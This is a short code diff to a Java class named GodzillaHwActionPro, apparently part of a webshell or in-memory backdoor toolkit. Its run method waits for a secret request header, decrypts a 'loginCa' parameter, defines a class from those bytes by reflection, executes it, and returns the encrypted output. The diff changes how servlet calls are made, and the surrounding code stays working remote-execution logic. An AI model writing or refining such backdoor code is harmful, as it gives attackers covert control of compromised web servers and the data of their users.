@@ -54,17 +54,20 @@ public class GodzillaHwActionPro {
 
     @SuppressWarnings("all")
     private boolean run(Object request, Object response) throws Exception {
-        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+        String value = ((HttpServletRequest) request).getHeader(headerName);
         if (value == null || !value.contains(headerValue)) {
             return false;
         }
-        String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, "loginCa");
+        String parameter = ((HttpServletRequest) request).getParameter("loginCa");
         byte[] data = x(radomDecrypt(parameter), false);
         if (payload == null) {
             payload = reflectionDefineClass(data);
             return true;
         }
-        PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
+        if (((HttpServletResponse) response).isCommitted()) {
+            return true;
+        }
+        PrintWriter writer = ((HttpServletResponse) response).getWriter();
         try {
             writer.write("{\"msg\":\"" + radomEncrypt(x(execute(request, data), true)) + "\"}");
         } catch (Throwable e) {
